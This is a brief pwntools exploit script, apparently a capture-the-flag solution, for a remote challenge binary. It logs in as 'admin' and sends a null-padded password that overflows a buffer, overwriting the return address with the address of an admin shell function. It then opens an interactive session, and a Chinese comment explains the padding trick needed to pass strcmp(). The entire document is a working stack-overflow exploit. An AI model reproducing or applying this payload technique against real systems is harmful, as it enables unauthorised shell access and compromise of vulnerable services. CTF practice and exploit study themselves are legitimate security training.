from pwn import *

p = remote('node4.buuoj.cn', 27718)

admin_shell = 0x400e88

payload = b'2jctf_pa5sw0rd'.ljust(0x60-0x18, b'\x00') + p64(admin_shell) # 必须用\x00字节填充，才能够通过strcmp()函数的判断。
p.sendline(b'admin')
p.sendline(payload)
p.interactive()